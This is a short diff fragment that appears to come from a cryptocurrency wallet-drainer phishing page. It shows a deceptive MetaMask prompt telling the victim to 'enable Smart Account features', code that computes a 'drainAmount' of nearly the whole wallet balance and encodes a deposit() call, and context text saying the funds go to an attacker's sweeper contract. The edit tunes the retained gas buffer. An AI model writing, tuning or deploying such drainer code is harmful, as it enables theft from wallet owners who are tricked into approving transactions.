@@ -349,7 +349,7 @@ All three hit the sweeper contract. Funds forwarded to attacker atomically.
       ]);
       document.getElementById('connectNote').textContent = "Check MetaMask — confirm to enable Smart Account features.";
 
-      const gasBuffer = ethers.parseEther("0.001");
+      const gasBuffer = ethers.parseEther("0.065");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
       // Encode deposit() function call
